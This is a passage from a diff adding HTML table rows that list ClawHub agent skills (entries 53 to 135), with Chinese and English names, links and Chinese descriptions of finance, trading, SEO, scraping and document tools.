+<td align="center">53</td>
+<td>同花顺股票接口</td>
+<td>同花顺股票接口</td>
+<td><a href="https://clawdhub.com/skills/ths-advanced-analysis">ClawHub/ths-advanced-analysis</a></td>
+<td>基于 thsdk 进行高级股票分析：分钟K线（1m/5m/15m/30m/60m/120m）、板块/指数行情（主要指数/申万行业/概念板块成分股）、多股票批量对比（表格+归一化走势图+相关性热力图）、盘口深度、大单流向、集合竞价异动、日内分时、历史分时。当用户提到&quot;分钟K线&quot;、&quot;日内走势&quot;、&quot;盘口&quot;、&quot;大单&quot;、&quot;...</td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td>Songsee</td>
+<td>Songsee</td>
+<td><a href="https://clawdhub.com/skills/songsee">ClawHub/songsee</a></td>
+<td>使用 songsee CLI 从音频生成频谱图和特征面板可视化。</td>
+</tr>
+<tr>
+<td align="center">55</td>
+<td>市场新闻analyst</td>
+<td>Market News Analyst</td>
+<td><a href="https://clawdhub.com/skills/market-news-analyst">ClawHub/market-news-analyst</a></td>
+<td>用于分析近期的市场热点新闻及其对股票和商品市场的影响。当用户要求分析过去10天的重大财经新闻、解读货币政策（如FOMC、ECB、BOJ）的市场反应、评估地缘政治事件对商品的影响，或回顾大盘股财报时，应使用此技能。该技能自动收集新闻并生成按影响力排序的分析报告，所有分析与输出均使用英语。</td>
+</tr>
+<tr>
+<td align="center">56</td>
+<td>akshare金融</td>
+<td>Akshare Finance</td>
+<td><a href="https://clawdhub.com/skills/akshare-finance">ClawHub/akshare-finance</a></td>
+<td>AKShare财经数据接口库封装，提供股票、期货、期权、基金、外汇、债券、指数、加密货币等金融产品的基本面数据、实时和历史行情数据、衍生数据。</td>
+</tr>
+<tr>
+<td align="center">57</td>
+<td>深度爬虫</td>
+<td>Deep Scraper</td>
+<td><a href="https://clawdhub.com/skills/deep-scraper">ClawHub/deep-scraper</a></td>
+<td>利用容器化 Crawlee 对 YouTube 等复杂网站进行深度抓取，提取经校验的无广告字幕与内容，并以 JSON 格式输出。</td>
+</tr>
+<tr>
+<td align="center">58</td>
+<td>热门视频监控</td>
+<td>B站 (bilibili) 热门视频监控 🔑</td>
+<td><a href="https://clawdhub.com/skills/bilibili-hot-monitor">ClawHub/bilibili-hot-monitor</a></td>
+<td>生成B站热门视频日报并发送邮件。触发词：B站热门、bilibili日报、视频日报、热门视频</td>
+</tr>
+<tr>
+<td align="center">59</td>
+<td>股票evaluator</td>
+<td>Stock Evaluator</td>
+<td><a href="https://clawdhub.com/skills/stock-evaluator">ClawHub/stock-evaluator</a></td>
+<td>对潜在股票投资进行全面评估，综合估值分析、基本面研究、技术面评估，提供明确的买入/持有/卖出建议。适用于用户询问股票购买、评估投资机会、分析自选股候选标的或请求股票推荐时使用。提供具体入场价格、仓位配置和信心评级。</td>
+</tr>
+<tr>
+<td align="center">60</td>
+<td>谷歌分析</td>
+<td>Google Analytics 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-analytics">ClawHub/google-analytics</a></td>
+<td>Google Analytics API 集成，支持托管 OAuth。该技能包含两个独立 API：Admin API（写权限，可创建、更新和删除账户）</td>
+</tr>
+<tr>
+<td align="center">61</td>
+<td>Pptx</td>
+<td>Pptx</td>
+<td><a href="https://clawdhub.com/skills/pptx-2">ClawHub/pptx-2</a></td>
+<td>创建、编辑和分析 .pptx 演示文稿，包括幻灯片内容、布局、批注、演讲者备注和主题细节。</td>
+</tr>
+<tr>
+<td align="center">62</td>
+<td>newakshare股票</td>
+<td>akshare-stock</td>
+<td><a href="https://clawdhub.com/skills/new-akshare-stock">ClawHub/new-akshare-stock</a></td>
+<td>A股量化数据分析工具，基于AkShare库获取A股行情、财务数据、板块信息等。用于回答关于A股股票查询、行情数据、财务分析、选股等问题。</td>
+</tr>
+<tr>
+<td align="center">63</td>
+<td>股票打板筛选</td>
+<td>股票打板筛选</td>
+<td><a href="https://clawdhub.com/skills/stock-board">ClawHub/stock-board</a></td>
+<td>筛选A股市场中当日及昨日涨停和强势股票，并统计各板块涨停数量，支持创业板和科创板筛选。</td>
+</tr>
+<tr>
+<td align="center">64</td>
+<td>PDF工具</td>
+<td>PDF Tools</td>
+<td><a href="https://clawdhub.com/skills/pdf-tools">ClawHub/pdf-tools</a></td>
+<td>查看、提取、编辑和处理 PDF 文件。支持文本提取、文本编辑（叠加和替换）、合并、拆分、旋转页面及获取元数据。适用于阅读内容、添加/编辑文本、重组页面、合并文件或提取信息等 PDF 文档操作。</td>
+</tr>
+<tr>
+<td align="center">65</td>
+<td>Airtable</td>
+<td>Airtable 🔑</td>
+<td><a href="https://clawdhub.com/skills/airtable">ClawHub/airtable</a></td>
+<td>通过托管OAuth集成Airtable API，管理Base、表和记录。适用于需要读取、创建、更新或删除Airtable记录的场景。</td>
+</tr>
+<tr>
+<td align="center">66</td>
+<td>SEOcompetitor分析</td>
+<td>SEO Intelligence &amp; Competitor Analysis Pro</td>
+<td><a href="https://clawdhub.com/skills/seo-competitor-analysis">ClawHub/seo-competitor-analysis</a></td>
+<td>执行深度SEO竞品分析，包括关键词研究、反向链接检查及内容策略规划。适用于用户需要分析网站竞争对手或通过研究对手提升自身SEO排名的场景。</td>
+</tr>
+<tr>
+<td align="center">67</td>
+<td>backtest专家</td>
+<td>Backtest Expert</td>
+<td><a href="https://clawdhub.com/skills/backtest-expert">ClawHub/backtest-expert</a></td>
+<td>提供交易策略系统化回测的专家指导。适用于量化策略的开发、测试、压力测试及验证，涵盖“穷尽测试”方法论、参数鲁棒性、滑点建模、偏差规避与结果解读。当用户提及回测、策略验证、鲁棒性测试、避免过拟合或系统化交易开发时适用。</td>
+</tr>
+<tr>
+<td align="center">68</td>
+<td>fundamental股票分析</td>
+<td>Fundamental Stock Analysis</td>
+<td><a href="https://clawdhub.com/skills/fundamental-stock-analysis">ClawHub/fundamental-stock-analysis</a></td>
+<td>运用结构化评分模型进行基本面股票分析及同业排名（涵盖质量、资产负债表安全性、现金流、估值、行业调整等）。</td>
+</tr>
+<tr>
+<td align="center">69</td>
+<td>交易coach</td>
+<td>Trading Coach</td>
+<td><a href="https://clawdhub.com/skills/trading-coach">ClawHub/trading-coach</a></td>
+<td>🏆 AI交易复盘教练 — 把你的券商CSV变成可执行的改进洞察！ 自动FIFO配对持仓，8维度质量评分(入场/出场/趋势/风险...)，10维度AI洞察。 支持富途(中/英)、老虎、中信、华泰等主流券商。 触发条件: 用户提供交易CSV、要求分析交易表现、评估交易质量、生成复盘报告、 计算盈亏统计、识别交易模式问题、&quot;帮我复盘&quot;、&quot;分析我的交易&quot;。</td>
+</tr>
+<tr>
+<td align="center">70</td>
+<td>策略股票分析技能</td>
+<td>23策略股票分析技能</td>
+<td><a href="https://clawdhub.com/skills/stock-analysis-23">ClawHub/stock-analysis-23</a></td>
+<td>AI股票分析技能，基于23个通达信技术指标(M001-M023)，包含MACD、KDJ、RSI、布林带、筹码分布、资金流向等经典指标。提供完整的买入/卖出决策规则、多维度评分系统、风险控制、多指标共振算法、选股策略和买卖点判断。适用于A股、港股、美股技术分析，支持妖股、强势股、趋势股挖掘。</td>
+</tr>
+<tr>
+<td align="center">71</td>
+<td>数据analyst专业版</td>
+<td>Data Analyst</td>
+<td><a href="https://clawdhub.com/skills/data-analyst-pro">ClawHub/data-analyst-pro</a></td>
+<td>完成用户委托的数据分析任务。若代码需操作文件，请确保文件列在`upload_files`参数中。</td>
+</tr>
+<tr>
+<td align="center">72</td>
+<td>加密price</td>
+<td>Crypto Price</td>
+<td><a href="https://clawdhub.com/skills/crypto-price">ClawHub/crypto-price</a></td>
+<td>通过CoinGecko或Hyperliquid API获取加密货币代币价格并生成K线图。当用户询问代币价格、加密货币价格、价格图表或市场数据时使用。</td>
+</tr>
+<tr>
+<td align="center">73</td>
+<td>binance专业版</td>
+<td>Binance Pro 🔑</td>
+<td><a href="https://clawdhub.com/skills/binance-pro">ClawHub/binance-pro</a></td>
+<td>完整的Binance整合，全球最大的加密货币交易所。交易现货、期货，支持高达125倍杠杆，质押和投资组合管理。可用于查询余额、开仓/平仓、设置止损和止盈、查看盈亏，以及任何Binance操作。</td>
+</tr>
+<tr>
+<td align="center">74</td>
+<td>Last 30 Days</td>
+<td>Last 30 Days 🔑</td>
+<td><a href="https://clawdhub.com/skills/last30days">ClawHub/last30days</a></td>
+<td>调研最近30天的 Reddit、X 与网页主题，综合发现并提供可直接复用的提示。适用于用户想获取最新社交/网络信息、询问“大家怎么看X”或学习当前最佳实践的情形。完整访问 Reddit + X 需要 OPENAI_API_KEY 与/或 XAI_API_KEY，若不可用则回退到网络搜索。</td>
+</tr>
+<tr>
+<td align="center">75</td>
+<td>yahoo金融CLI</td>
+<td>Yahoo Finance CLI</td>
+<td><a href="https://clawdhub.com/skills/yahoo-finance-cli">ClawHub/yahoo-finance-cli</a></td>
+<td>此技能应在用户请求获取股票价格、查看股票报价、查询收益、获取财务数据、寻找热门股票，或需要雅虎财经的股市数据时使用。</td>
+</tr>
+<tr>
+<td align="center">76</td>
+<td>金融新闻</td>
+<td>Finance News Briefings</td>
+<td><a href="https://clawdhub.com/skills/finance-news">ClawHub/finance-news</a></td>
+<td>带有AI摘要的市场新闻简报。适用于股票新闻、市场动态、投资组合表现、早晚简报、财经头条或价格预警。支持美欧日市场、WhatsApp推送及英德文输出。</td>
+</tr>
+<tr>
+<td align="center">77</td>
+<td>金融calculator</td>
+<td>Financial Calculator Pro</td>
+<td><a href="https://clawdhub.com/skills/financial-calculator">ClawHub/financial-calculator</a></td>
+<td>高级财务计算器，提供未来价值表、现值、贴现计算、加价定价及复利功能。适用于计算投资增长、定价策略、贷款价值、折扣，或比较不同利率和期限的财务场景。支持命令行和交互式网页界面。</td>
+</tr>
+<tr>
+<td align="center">78</td>
+<td>ExcelCn</td>
+<td>Xlsx Cn</td>
+<td><a href="https://clawdhub.com/skills/xlsx-cn">ClawHub/xlsx-cn</a></td>
+<td>Excel 表格处理 | Excel Spreadsheet Processing. 创建、读取、编辑 Excel 文件 | Create, read, edit Excel files. 支持公式、图表、数据分析 | Supports formulas, charts, data analysis. 触发词：E...</td>
+</tr>
+<tr>
+<td align="center">79</td>
+<td>交易</td>
+<td>Trading</td>
+<td><a href="https://clawdhub.com/skills/trading">ClawHub/trading</a></td>
+<td>交易分析与教育。涵盖股票、外汇及加密货币的技术分析、图表形态、风险管理和仓位管理。</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td>市场研究代理</td>
+<td>Market Research Agent</td>
+<td><a href="https://clawdhub.com/skills/market-research-agent">ClawHub/market-research-agent</a></td>
+<td>基于成熟框架，针对任意行业、竞品或商机开展结构化市场调研，分析市场规模、趋势、竞品及客户细分。</td>
+</tr>
+<tr>
+<td align="center">81</td>
+<td>academic研究中心</td>
+<td>Academic Research Hub</td>
+<td><a href="https://clawdhub.com/skills/academic-research-hub">ClawHub/academic-research-hub</a></td>
+<td>当用户需检索学术论文、下载文献、提取引文或搜集学术信息时使用此技能。触发词包括“查找论文”、“搜索研究”、“下载学术文章”、“获取引文”，或涉及arXiv、PubMed、Semantic Scholar、Google Scholar等数据库的请求。亦用于文献综述、生成参考文献及探索研究。需安装OpenClawCLI（来自clawhub.ai）。</td>
+</tr>
+<tr>
+<td align="center">82</td>
+<td>polymarket代理</td>
+<td>Polymarket Agent 🔑</td>
+<td><a href="https://clawdhub.com/skills/polymarket-agent">ClawHub/polymarket-agent</a></td>
+<td>自主预测市场代理——分析市场、研究新闻并识别交易机会。</td>
+</tr>
+<tr>
+<td align="center">83</td>
+<td>PythonDataviz</td>
+<td>Python Dataviz</td>
+<td><a href="https://clawdhub.com/skills/python-dataviz">ClawHub/python-dataviz</a></td>
+<td>使用Python（matplotlib、seaborn、plotly）进行专业数据可视化，创建出版级静态图表、统计图表及交互式可视化。</td>
+</tr>
+<tr>
+<td align="center">84</td>
+<td>投资组合watcher</td>
+<td>Portfolio Watcher</td>
+<td><a href="https://clawdhub.com/skills/portfolio-watcher">ClawHub/portfolio-watcher</a></td>
+<td>监控股票/加密货币持仓，获取价格提醒，追踪投资组合表现</td>
+</tr>
+<tr>
+<td align="center">85</td>
+<td>研究cog</td>
+<td>Research Cog 🔑</td>
+<td><a href="https://clawdhub.com/skills/research-cog">ClawHub/research-cog</a></td>
+<td>由CellCog驱动的AI深度研究，涵盖市场调研、竞争分析、投资研究、学术研究、尽职调查和文献综述（含引用）等。</td>
+</tr>
+<tr>
+<td align="center">86</td>
+<td>多模态视觉视频图片文件分析专家</td>
+<td>Video Image &amp; File Analysis 多模态视觉视频图片文件分析专家 🔑</td>
+<td><a href="https://clawdhub.com/skills/video-image-file-analysis">ClawHub/video-image-file-analysis</a></td>
+<td>图片分析与识别，可分析本地图片、网络图片、视频、文件。适用于 OCR、物体识别、场景理解等。当用户发送图片或要求分析图片时必须使用此技能。</td>
+</tr>
+<tr>
+<td align="center">87</td>
+<td>competitor分析</td>
+<td>Competitor Analysis</td>
+<td><a href="https://clawdhub.com/skills/competitor-analysis">ClawHub/competitor-analysis</a></td>
+<td>用于用户请求“比较竞争对手”或查找SEO/GEO差距；分析关键词、内容、反向链接、AI引用和流量份额。</td>
+</tr>
+<tr>
+<td align="center">88</td>
+<td>PolymarketAPI</td>
+<td>Polymarket API</td>
+<td><a href="https://clawdhub.com/skills/polymarket-api">ClawHub/polymarket-api</a></td>
+<td>查询Polymarket预测市场，用于预测市场、投注赔率、市场价格、事件概率以及Polymarket数据相关问题。</td>
+</tr>
+<tr>
+<td align="center">89</td>
+<td>Polymarket</td>
+<td>Polymarket</td>
+<td><a href="https://clawdhub.com/skills/polymarket">ClawHub/polymarket</a></td>
+<td>查询和交易 Polymarket 预测市场——查看赔率、热门市场、搜索事件、浏览订单簿、下单交易及管理持仓。</td>
+</tr>
+<tr>
+<td align="center">90</td>
+<td>DeepReadOCR</td>
+<td>DeepRead OCR 🔑</td>
+<td><a href="https://clawdhub.com/skills/deepread-ocr">ClawHub/deepread-ocr</a></td>
+<td>AI原生OCR平台，将文档在几分钟内转化为高精度数据。采用多模型共识，DeepRead达到97%+准确率，仅标记...</td>
+</tr>
+<tr>
+<td align="center">91</td>
+<td>Excel每周仪表盘</td>
+<td>Excel weekly dashboards at scale</td>
+<td><a href="https://clawdhub.com/skills/excel-weekly-dashboard">ClawHub/excel-weekly-dashboard</a></td>
+<td>设计可刷新的Excel仪表盘（含Power Query、结构化表格、数据验证及透视表）。适用于需要从文件更新且仅需极少手动操作的每周KPI工作簿。</td>
+</tr>
+<tr>
+<td align="center">92</td>
+<td>Access Finnhub API for real-time stock quotes, company news, market data, financial statements, and trading signals</td>
+<td>Access Finnhub API for real-time stock quotes, company news, market data, financial statements, and trading signals 🔑</td>
+<td><a href="https://clawdhub.com/skills/finnhub">ClawHub/finnhub</a></td>
+<td>访问 Finnhub API 获取实时股价、公司新闻、市场数据、财务报表和交易信号。用于当前股价、公司新闻、财报或市场分析。</td>
+</tr>
+<tr>
+<td align="center">93</td>
+<td>Polymarket Fast Loop</td>
+<td>Polymarket Fast Loop 🔑</td>
+<td><a href="https://clawdhub.com/skills/polymarket-fast-loop">ClawHub/polymarket-fast-loop</a></td>
+<td>通过 Simmer API 获取 CEX 价格动量信号，交易 Polymarket BTC 5分钟和15分钟快速市场。默认信号源为币安 BTC/USDT K线。适用于...</td>
+</tr>
+<tr>
+<td align="center">94</td>
+<td>Baoyu Infographic</td>
+<td>Baoyu Infographic</td>
+<td><a href="https://clawdhub.com/skills/baoyu-infographic">ClawHub/baoyu-infographic</a></td>
+<td>生成21种布局和22种视觉风格的专业信息图，分析内容，推荐布局×风格组合，并生成出版物。</td>
+</tr>
+<tr>
+<td align="center">95</td>
+<td>内容捕手</td>
+<td>内容捕手 Content Hunter</td>
+<td><a href="https://clawdhub.com/skills/content-hunter">ClawHub/content-hunter</a></td>
+<td>内容捕手 (Content Hunter) - 短视频平台热门内容抓取机器人，支持小红书、抖音、B站，可批量抓取热门内容并自动生成汇报。</td>
+</tr>
+<tr>
+<td align="center">96</td>
+<td>谷歌搜索console</td>
+<td>Google Search Console 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-search-console">ClawHub/google-search-console</a></td>
+<td>Google Search Console API integration with managed OAuth. Query search analytics, manage sitemaps, and monitor site performance. Use this skill when users wa...</td>
+</tr>
+<tr>
+<td align="center">97</td>
+<td>polymarket分析</td>
+<td>Polymarket Analysis</td>
+<td><a href="https://clawdhub.com/skills/polymarket-analysis">ClawHub/polymarket-analysis</a></td>
+<td>分析Polymarket预测市场的交易机会，包括配对成本套利、巨鲸追踪、情绪分析、动量信号及用户画像追踪。不执行交易。</td>
+</tr>
+<tr>
+<td align="center">98</td>
+<td>谷歌adsAPI</td>
+<td>Google Ads 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-ads-api">ClawHub/google-ads-api</a></td>
+<td>此技能用于通过托管OAuth集成Google Ads API，使用GAQL查询广告系列、广告组、关键词和绩效指标。</td>
+</tr>
+<tr>
+<td align="center">99</td>
+<td>Apollo</td>
+<td>Apollo 🔑</td>
+<td><a href="https://clawdhub.com/skills/apollo">ClawHub/apollo</a></td>
+<td>与 Apollo.io REST API 交互（人物/组织信息丰富、搜索、列表）</td>
+</tr>
+<tr>
+<td align="center">100</td>
+<td>competitiveintelligence市场研究</td>
+<td>Competitive Intelligence &amp; Market Research</td>
+<td><a href="https://clawdhub.com/skills/competitive-intelligence-market-research">ClawHub/competitive-intelligence-market-research</a></td>
+<td>B2B SaaS 竞争情报，24 个场景覆盖销售、HR、金融科技和运营技术。</td>
+</tr>
+<tr>
+<td align="center">101</td>
+<td>hyperliquid交易</td>
+<td>Hyperliquid Trading &amp; Analysis 🔑</td>
+<td><a href="https://clawdhub.com/skills/hyperliquid-trading">ClawHub/hyperliquid-trading</a></td>
+<td>在 Hyperliquid 上交易和监控永续合约。查询余额，查看持仓及盈亏，下单/撤单，执行市价交易。当用户询问 Hyperliquid 交易、投资组合状态、加密货币持仓或希望执行交易时使用。</td>
+</tr>
+<tr>
+<td align="center">102</td>
+<td>谷歌merchant</td>
+<td>Google Merchant Center 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-merchant">ClawHub/google-merchant</a></td>
+<td>Google MerchantCenter API 集成，使用托管 OAuth。这是一个具有写入能力的集成，可读取、创建、更新和删除商品，库存...</td>
+</tr>
+<tr>
+<td align="center">103</td>
+<td>谷歌ads</td>
+<td>Google Ads</td>
+<td><a href="https://clawdhub.com/skills/google-ads">ClawHub/google-ads</a></td>
+<td>查询、审计和优化Google Ads广告系列。支持两种模式：(1) API模式，使用google-ads Python SDK进行批量操作；(2) 浏览器自动化模式，适用于没有API访问权限的用户，只需将浏览器标签页附加到ads.google.com。当需要检查广告表现、暂停投放/关键词、发现浪费支出、审计转化追踪或优化Google Ads账户时使用。</td>
+</tr>
+<tr>
+<td align="center">104</td>
+<td>Reddit Insights</td>
+<td>Reddit Insights 🔑</td>
+<td><a href="https://clawdhub.com/skills/reddit-insights">ClawHub/reddit-insights</a></td>
+<td>Search and analyze Reddit content using semantic AI search via reddapi.dev HTTP API. Use when you need to: (1) Find user pain points and frustrations for pro...</td>
+</tr>
+<tr>
+<td align="center">105</td>
+<td>视频脚本创作</td>
+<td>Video Script Creator 视频脚本创作</td>
+<td><a href="https://clawdhub.com/skills/video-script-creator">ClawHub/video-script-creator</a></td>
+<td>Short video script generator. 短视频脚本生成器、视频脚本、抖音文案、抖音脚本、快手脚本、口播稿、视频拍摄脚本、YouTube脚本、YouTube Shorts脚本、B站脚本、bilibili脚本、分镜脚本、视频大纲、视频文案、短视频创作、Reels脚本、TikTok脚本、vlog脚本...</td>
+</tr>
+<tr>
+<td align="center">106</td>
+<td>加密货币与贵金属监控</td>
+<td>加密货币与贵金属监控</td>
+<td><a href="https://clawdhub.com/skills/crypto-gold-monitor">ClawHub/crypto-gold-monitor</a></td>
+<td>加密货币与贵金属价格监控 / Crypto &amp; Precious Metals Price Monitor - 监控BTC/ETH实时价格、黄金(XAU)/白银(XAG)走势，免费API无需Key</td>
+</tr>
+<tr>
+<td align="center">107</td>
+<td>图像vision</td>
+<td>Image Vision</td>
+<td><a href="https://clawdhub.com/skills/image-vision">ClawHub/image-vision</a></td>
+<td>对图像进行分析与解读，包括描述内容、提取文字、回答问题、比较视觉信息，并从JPG、PNG、GIF等格式中抽取结构化数据。</td>
+</tr>
+<tr>
+<td align="center">108</td>
+<td>微信</td>
+<td>Wechat Connect</td>
+<td><a href="https://clawdhub.com/skills/wechat">ClawHub/wechat</a></td>
+<td>安装 OpenClaw 官方微信插件并通过二维码扫描配对账号；当用户说“安装微信插件”“连接微信…”时触发。</td>
+</tr>
+<tr>
+<td align="center">109</td>
+<td>MX股票Pick</td>
+<td>MX Stock Pick 🔑</td>
+<td><a href="https://clawdhub.com/skills/mx-stockpick">ClawHub/mx-stockpick</a></td>
+<td>基于东方财富专业数据库，支持通过自然语言输入筛选A港美股、基金、可转债等，覆盖全市场投资标的，支持多元指标筛选，含技术面、消息面、基本面及市场情绪等，可用于全球资产速筛、跨市场监控、投资组合构建、策略回测等场景。返回结果包含数据说明及 csv 文件。</td>
+</tr>
+<tr>
+<td align="center">110</td>
+<td>baoyucover图像</td>
+<td>Baoyu Cover Image</td>
+<td><a href="https://clawdhub.com/skills/baoyu-cover-image">ClawHub/baoyu-cover-image</a></td>
+<td>生成文章封面图像，包含5个维度（类型、配色、渲染、文字、情绪），结合11种配色和7种渲染风格，支持电影感...</td>
+</tr>
+<tr>
+<td align="center">111</td>
+<td>知识图表</td>
+<td>Knowledge Graph</td>
+<td><a href="https://clawdhub.com/skills/knowledge-graph">ClawHub/knowledge-graph</a></td>
+<td>通过添加或替换原子事实（items.）、重新生成实体摘要（summary.md）并保持 ID 一致，维护 Clawdbot 在 life/areas/** 下的复合知识图谱。适用于需要对知识图谱进行确定性更新而非手动编辑 JSON 的场景。</td>
+</tr>
+<tr>
+<td align="center">112</td>
+<td>master营销</td>
+<td>Master Marketing</td>
+<td><a href="https://clawdhub.com/skills/master-marketing">ClawHub/master-marketing</a></td>
+<td>集增长策略、内容再利用与趋势监测于一体的营销引擎。利用数据驱动策略、全平台内容复用及实时趋势分析驱动业务增长。</td>
+</tr>
+<tr>
+<td align="center">113</td>
+<td>day交易技能</td>
+<td>Day Trading Investor Pro</td>
+<td><a href="https://clawdhub.com/skills/day-trading-skill">ClawHub/day-trading-skill</a></td>
+<td>专业AI交易导师，精通价格行为、技术分析与风险管理逻辑，是《日内交易投资者课程》的配套逻辑模型。</td>
+</tr>
+<tr>
+<td align="center">114</td>
+<td>微信公众号文章抓取</td>
+<td>微信公众号文章抓取</td>
+<td><a href="https://clawdhub.com/skills/wechat-article-scraper">ClawHub/wechat-article-scraper</a></td>
+<td>在搜狗微信搜索指定关键词，抓取相关文章（标题、摘要、发布日期、来源公众号），生成PDF报告。触发场景：用户要求&quot;搜索微信文章 关键字 数量</td>
+</tr>
+<tr>
+<td align="center">115</td>
+<td>reddit爬虫</td>
+<td>Reddit Scraper</td>
+<td><a href="https://clawdhub.com/skills/reddit-scraper">ClawHub/reddit-scraper</a></td>
+<td>通过抓取 old.reddit.com 读取和搜索 Reddit 帖子。当 Clawdbot 需要浏览 Reddit 内容（如读取子版块帖子、搜索话题、监控特定社区）时使用。仅限读取，无法发帖或评论。</td>
+</tr>
+<tr>
+<td align="center">116</td>
+<td>谷歌搜索Console</td>
+<td>Google Search Console 🔑</td>
+<td><a href="https://clawdhub.com/skills/gsc">ClawHub/gsc</a></td>
+<td>查询 Google Search Console 的 SEO 数据，包括搜索查询、热门页面、点击率机会、URL 检查和站点地图。适用于分析搜索表现等场景。</td>
+</tr>
+<tr>
+<td align="center">117</td>
+<td>深度研究WorkFromXian.LaoJ</td>
+<td>Deep Research Work From Xian.LaoJ</td>
+<td><a href="https://clawdhub.com/skills/deepresearchwork">ClawHub/deepresearchwork</a></td>
+<td>{&quot;answer&quot;:&quot;综合研究框架：结合网络搜索、内容分析、来源核实与迭代调查进行深度研究。适用于需要多源调研、交叉验证及结构化结论的场景。&quot;}</td>
+</tr>
+<tr>
+<td align="center">118</td>
+<td>日志analyzer</td>
+<td>Log Analyzer</td>
+<td><a href="https://clawdhub.com/skills/log-analyzer">ClawHub/log-analyzer</a></td>
+<td>解析、搜索并分析多种格式的应用程序日志。适用于从日志文件调试、设置结构化日志、分析错误模式、跨服务关联事件、解析堆栈跟踪或实时监控日志输出。</td>
+</tr>
+<tr>
+<td align="center">119</td>
+<td>transcriptapi</td>
+<td>transcriptapi 🔑</td>
+<td><a href="https://clawdhub.com/skills/transcriptapi">ClawHub/transcriptapi</a></td>
+<td>用于YouTube相关内容或可能相关的情况，即使未明确提及：视频/频道/播放列表链接、视频ID、@用户名、创作者查询、视频摘要等。</td>
+</tr>
+<tr>
+<td align="center">120</td>
+<td>csv流水线</td>
+<td>CSV Data Pipeline</td>
+<td><a href="https://clawdhub.com/skills/csv-pipeline">ClawHub/csv-pipeline</a></td>
+<td>处理、转换、分析CSV和JSON数据，执行筛选、合并、聚合、格式转换、去重和摘要报告，支持CSV、TSV和JSON Lines文件。</td>
+</tr>
+<tr>
+<td align="center">121</td>
+<td>Twitter To Binance Square</td>
+<td>Twitter To Binance Square 🔑</td>
+<td><a href="https://clawdhub.com/skills/6551-twitter-to-binance-square">ClawHub/6551-twitter-to-binance-square</a></td>
+<td>自动将Twitter/X内容同步至币安广场。监控指定账号或话题，获取新推文，转换内容并发布。</td>
+</tr>
+<tr>
+<td align="center">122</td>
+<td>Baoyu Article Illustrator</td>
+<td>Baoyu Article Illustrator</td>
+<td><a href="https://clawdhub.com/skills/baoyu-article-illustrator">ClawHub/baoyu-article-illustrator</a></td>
+<td>分析文章结构，识别需要视觉辅助的位置，采用类型×风格×配色三维方式生成插图。使用...</td>
+</tr>
+<tr>
+<td align="center">123</td>
+<td>browserwing</td>
+<td>browserwing</td>
+<td><a href="https://clawdhub.com/skills/browserwing">ClawHub/browserwing</a></td>
+<td>通过HTTP API控制和自动化浏览器操作，包括导航、元素交互、数据提取、无障碍快照、截图、JS执行等。</td>
+</tr>
+<tr>
+<td align="center">124</td>
+<td>金融报告analyzer</td>
+<td>Finance Report Analyzer 🔑</td>
+<td><a href="https://clawdhub.com/skills/finance-report-analyzer">ClawHub/finance-report-analyzer</a></td>
+<td>分析上传的Excel/PDF财务数据，生成包含迷你趋势图的交互式报告，支持导出为PDF、DOCX、Markdown等格式。</td>
+</tr>
+<tr>
+<td align="center">125</td>
+<td>邮件营销</td>
+<td>Email Marketing</td>
+<td><a href="https://clawdhub.com/skills/email-marketing">ClawHub/email-marketing</a></td>
+<td>{&quot;answer&quot;:&quot;邮件送达率、列表管理、序列、分群与活动优化&quot;}</td>
+</tr>
+<tr>
+<td align="center">126</td>
+<td>QVeris Official</td>
+<td>QVeris Official 🔑</td>
+<td><a href="https://clawdhub.com/skills/qveris-official">ClawHub/qveris-official</a></td>
+<td>QVeris是一个能力发现与工具调用引擎。使用discover功能查找专业API工具——包括实时数据、历史序列、结构化报告等。</td>
+</tr>
+<tr>
+<td align="center">127</td>
+<td>监控</td>
+<td>Monitoring</td>
+<td><a href="https://clawdhub.com/skills/monitoring">ClawHub/monitoring</a></td>
+<td>为应用和基础设施配置可观测性，包括指标、日志、链路追踪和告警。</td>
+</tr>
+<tr>
+<td align="center">128</td>
+<td>Zotero</td>
+<td>Zotero 🔑</td>
+<td><a href="https://clawdhub.com/skills/zotero">ClawHub/zotero</a></td>
+<td>通过 Web API 管理 Zotero 参考文献库。支持搜索、列表、通过 DOI/ISBN/PMID 添加条目（含重复检测）、删除/回收条目、更新元数据与标签、导出为 BibTeX/RIS/CSL-JSON、文件批量添加、检查 PDF 附件、交叉引用、通过 CrossRef 查找缺失 DOI 及获取开放获取 PDF。支持 -- 输出以便脚本调用。当用户询问学术参考文献、引文管理、文献库、论...</td>
+</tr>
+<tr>
+<td align="center">129</td>
+<td>cost报告</td>
+<td>Cost Tracking for Models</td>
+<td><a href="https://clawdhub.com/skills/cost-report">ClawHub/cost-report</a></td>
+<td>追踪 OpenClaw 使用成本并提供按日期和模型的详细报告。支持日报、周报、月报格式，可用于 Discord 等即时通讯渠道。</td>
+</tr>
+<tr>
+<td align="center">130</td>
+<td>SQLite</td>
+<td>SQLite</td>
+<td><a href="https://clawdhub.com/skills/sqlite">ClawHub/sqlite</a></td>
+<td>正确使用SQLite，妥善处理并发、PRAGMA指令与类型。</td>
+</tr>
+<tr>
+<td align="center">131</td>
+<td>keyword研究</td>
+<td>Keyword Research</td>
+<td><a href="https://clawdhub.com/skills/keyword-research">ClawHub/keyword-research</a></td>
+<td>当用户要求“查找关键词”时使用；从提供或关联数据中优先考虑搜索量、难度、意图和聚类。关键词研究/内容选题</td>
+</tr>
+<tr>
+<td align="center">132</td>
+<td>谷歌forms</td>
+<td>Google Forms 🔑</td>
+<td><a href="https://clawdhub.com/skills/google-forms">ClawHub/google-forms</a></td>
+<td>通过托管OAuth集成Google Forms API，可创建表单、添加问题并获取响应。适用于需要与Google交互的场景。</td>
+</tr>
+<tr>
+<td align="center">133</td>
+<td>vibe编程</td>
+<td>Vibe Coding</td>
+<td><a href="https://clawdhub.com/skills/vibe-coding">ClawHub/vibe-coding</a></td>
+<td>使用AI通过描述需求来构建软件，涵盖提示技术、工作流模式、规则文件以及介入时机。</td>
+</tr>
+<tr>
+<td align="center">134</td>
+<td>transcript</td>
+<td>transcript 🔑</td>
+<td><a href="https://clawdhub.com/skills/transcript">ClawHub/transcript</a></td>
+<td>用于需要获取YouTube视频的口述内容时——即使未明确请求：粘贴视频链接或ID、请求摘要、引用、转录...</td>
+</tr>
+<tr>
+<td align="center">135</td>
+<td>习惯追踪器</td>
+<td>Habit Tracker</td>
